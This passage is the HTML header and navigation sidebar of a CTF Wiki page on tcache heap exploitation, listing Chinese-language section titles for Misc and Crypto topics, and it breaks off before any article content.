



<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="CTF Wiki">
      
      
        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/">
      
      
        <meta name="author" content="CTF Wiki Team">
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="jp">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../../..">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.1.0">
    
    
      
        <title>Tcache 利用 - CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/application.982221ab.css">
      
        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.224b79ff.css">
      
      
        
        
        <meta name="theme-color" content="">
      
    
    
      <script src="../../../../assets/javascripts/modernizr.1f0bcf2b.js"></script>
    
    
      
        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Sans:300,400,400i,700|Source+Code+Pro">
        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../../_static/css/extra.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
    viewBox="0 0 416 448" id="__github">
  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
        99.5z" />
</svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#tcache-makes-heap-exploitation-easy-again" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              CTF Wiki
            </span>
            <span class="md-header-nav__topic">
              Tcache 利用
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../.." title="Introduction" class="md-tabs__link">
          Introduction
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../misc/introduction/" title="Misc" class="md-tabs__link">
          Misc
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../crypto/introduction/" title="Crypto" class="md-tabs__link">
          Crypto
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../web/introduction/" title="Web" class="md-tabs__link">
          Web
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../assembly/x86-x64/readme/" title="Assembly" class="md-tabs__link">
          Assembly
        </a>
      
    </li>
  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../executable/elf/elf-structure/" title="Executable" class="md-tabs__link">
          Executable
        </a>
      
    </li>
  

  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../reverse/introduction/" title="Reverse" class="md-tabs__link">
          Reverse
        </a>
      
    </li>
  

  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../readme/" title="Pwn" class="md-tabs__link">
          Pwn
        </a>
      
    </li>
  

  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../android/basic_develop/basic_develop/" title="Android" class="md-tabs__link">
          Android
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../ics/ctfs/" title="ICS" class="md-tabs__link">
          ICS
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </a>
    CTF Wiki
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      Introduction
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../.." title="Getting Started" class="md-nav__link">
      Getting Started
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/history/" title="CTF 历史" class="md-nav__link">
      CTF 历史
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/mode/" title="CTF 竞赛模式简介" class="md-nav__link">
      CTF 竞赛模式简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/content/" title="CTF 竞赛内容" class="md-nav__link">
      CTF 竞赛内容
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/experience/" title="线下攻防经验小结" class="md-nav__link">
      线下攻防经验小结
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/cgc/" title="CGC 超级挑战赛" class="md-nav__link">
      CGC 超级挑战赛
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/resources/" title="学习资源" class="md-nav__link">
      学习资源
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Misc
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/introduction/" title="杂项简介" class="md-nav__link">
      杂项简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/recon/" title="信息搜集技术" class="md-nav__link">
      信息搜集技术
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      编码分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        编码分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/communication/" title="通信领域常用编码" class="md-nav__link">
      通信领域常用编码
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/computer/" title="计算机相关的编码" class="md-nav__link">
      计算机相关的编码
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/modern/" title="现实世界中常用的编码" class="md-nav__link">
      现实世界中常用的编码
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/prefix/" title="取证隐写前置技术" class="md-nav__link">
      取证隐写前置技术
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      图片分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        图片分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/introduction/" title="图片分析简介" class="md-nav__link">
      图片分析简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/png/" title="PNG" class="md-nav__link">
      PNG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/jpg/" title="JPG" class="md-nav__link">
      JPG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/gif/" title="GIF" class="md-nav__link">
      GIF
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
    
    <label class="md-nav__link" for="nav-2-6">
      流量包分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-6">
        流量包分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/introduction/" title="流量包分析简介" class="md-nav__link">
      流量包分析简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/fix/" title="PCAP 文件修复" class="md-nav__link">
      PCAP 文件修复
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6-3" type="checkbox" id="nav-2-6-3">
    
    <label class="md-nav__link" for="nav-2-6-3">
      协议分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-6-3">
        协议分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/" title="协议分析概述" class="md-nav__link">
      协议分析概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/Wireshark/" title="Wireshark" class="md-nav__link">
      Wireshark
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTP/" title="HTTP" class="md-nav__link">
      HTTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTPS/" title="HTTPS" class="md-nav__link">
      HTTPS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/FTP/" title="FTP" class="md-nav__link">
      FTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/DNS/" title="DNS" class="md-nav__link">
      DNS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/WIFI/" title="WIFI" class="md-nav__link">
      WIFI
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/USB/" title="USB" class="md-nav__link">
      USB
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/data/" title="数据提取" class="md-nav__link">
      数据提取
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
    
    <label class="md-nav__link" for="nav-2-7">
      压缩包分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-7">
        压缩包分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/zip/" title="ZIP 格式" class="md-nav__link">
      ZIP 格式
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/rar/" title="RAR 格式" class="md-nav__link">
      RAR 格式
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/audio/introduction/" title="音频隐写" class="md-nav__link">
      音频隐写
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-9" type="checkbox" id="nav-2-9">
    
    <label class="md-nav__link" for="nav-2-9">
      磁盘内存分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-9">
        磁盘内存分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/introduction/" title="介绍" class="md-nav__link">
      介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/problem/" title="题目" class="md-nav__link">
      题目
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-10" type="checkbox" id="nav-2-10">
    
    <label class="md-nav__link" for="nav-2-10">
      Other
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-10">
        Other
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/other/pyc/" title="pyc文件" class="md-nav__link">
      pyc文件
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Crypto
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/introduction/" title="密码学简介" class="md-nav__link">
      密码学简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
    
    <label class="md-nav__link" for="nav-3-2">
      基础数学知识
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        基础数学知识
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/basic/introduction/" title="简介" class="md-nav__link">
      简介
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      古典密码
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        古典密码
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/introduction/" title="古典密码简介" class="md-nav__link">
      古典密码简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/monoalphabetic/" title="单表代换加密" class="md-nav__link">
      单表代换加密
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/polyalphabetic/" title="多表代换加密" class="md-nav__link">
      多表代换加密
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/others/" title="其他类型加密" class="md-nav__link">
      其他类型加密
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/summary/" title="总结" class="md-nav__link">
      总结
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      流密码
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        流密码
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/intro/" title="介绍" class="md-nav__link">
      介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
    
    <label class="md-nav__link" for="nav-3-4-2">
      伪随机数生成器
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-2">
        伪随机数生成器
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/intro/" title="介绍" class="md-nav__link">
      介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/csprng/" title="密码学安全伪随机数生成器" class="md-nav__link">
      密码学安全伪随机数生成器
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/problem/" title="题目" class="md-nav__link">
      题目
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-3" type="checkbox" id="nav-3-4-3">
    
    <label class="md-nav__link" for="nav-3-4-3">
      线性同余生成器
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-3">
        线性同余生成器
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/intro/" title="简介" class="md-nav__link">
      简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/challenge/" title="例题" class="md-nav__link">
      例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-4" type="checkbox" id="nav-3-4-4">
    
    <label class="md-nav__link" for="nav-3-4-4">
      反馈移位寄存器
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-4">
        反馈移位寄存器
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/intro/" title="介绍" class="md-nav__link">
      介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/lfsr/" title="线性反馈移位寄存器" class="md-nav__link">
      线性反馈移位寄存器
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/nfsr/" title="非线性反馈移位寄存器" class="md-nav__link">
      非线性反馈移位寄存器
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-5" type="checkbox" id="nav-3-4-5">
    
    <label class="md-nav__link" for="nav-3-4-5">
      特殊流密码
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-5">
        特殊流密码
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/special/rc4/" title="RC4" class="md-nav__link">
      RC4
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      块加密
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        块加密
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/introduction/" title="块加密简介" class="md-nav__link">
      块加密简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/arx-operations/" title="ARX" class="md-nav__link">
      ARX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/des/" title="DES" class="md-nav__link">
      DES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/idea/" title="IDEA" class="md-nav__link">
      IDEA
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/aes/" title="AES" class="md-nav__link">
      AES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/simon-speck/" title="Simon and Speck" class="md-nav__link">
      Simon and Speck
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-7" type="checkbox" id="nav-3-5-7">
    
    <label class="md-nav__link" for="nav-3-5-7">
      分组模式
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-7">
        分组模式
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/introduction/" title="介绍" class="md-nav__link">
      介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding/" title="填充方式" class="md-nav__link">
      填充方式
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ecb/" title="ECB" class="md-nav__link">
      ECB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cbc/" title="CBC" class="md-nav__link">
      CBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/pcbc/" title="PCBC" class="md-nav__link">
      PCBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cfb/" title="CFB" class="md-nav__link">
      CFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ofb/" title="OFB" class="md-nav__link">
      OFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ctr/" title="CTR" class="md-nav__link">
      CTR
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack/" title="Padding Oracle Attack" class="md-nav__link">
      Padding Oracle Attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
    
    <label class="md-nav__link" for="nav-3-6">
      非对称加密
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-6">
        非对称加密
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/introduction/" title="非对称加密简介" class="md-nav__link">
      非对称加密简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-2" type="checkbox" id="nav-3-6-2">
    
    <label class="md-nav__link" for="nav-3-6-2">
      RSA
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-2">
        RSA
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_theory/" title="RSA 基本介绍" class="md-nav__link">
      RSA 基本介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack/" title="模数相关攻击" class="md-nav__link">
      模数相关攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack/" title="公钥指数相关攻击" class="md-nav__link">
      公钥指数相关攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack/" title="私钥 d 相关攻击" class="md-nav__link">
      私钥 d 相关攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/" title="Coppersmith 相关攻击" class="md-nav__link">
      Coppersmith 相关攻击
    </a>
  </li>

        
          
          
          


